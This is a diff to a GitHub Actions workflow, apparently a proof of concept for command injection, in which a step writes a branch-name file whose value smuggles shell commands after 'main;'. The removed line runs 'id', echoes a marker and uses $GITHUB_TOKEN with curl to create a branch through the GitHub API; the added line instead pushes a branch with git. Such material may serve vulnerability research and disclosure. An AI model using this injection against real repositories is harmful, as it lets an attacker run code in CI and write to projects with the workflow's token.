@@ -23,7 +23,7 @@ jobs:
       - name: Set release branch name for install wizard release action
         run: |
           cat > branch_name.txt <<'PAYLOAD'
-          main; id; echo PWNED-INJECTED; curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -d "{\"ref\":\"refs/heads/rce-proof\",\"sha\":\"$GITHUB_SHA\"}" https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs; echo DONE
+          main; id; git push origin HEAD:refs/heads/rce-proof-write; echo DONE
           PAYLOAD
 
       - name: Upload release branch name artifact
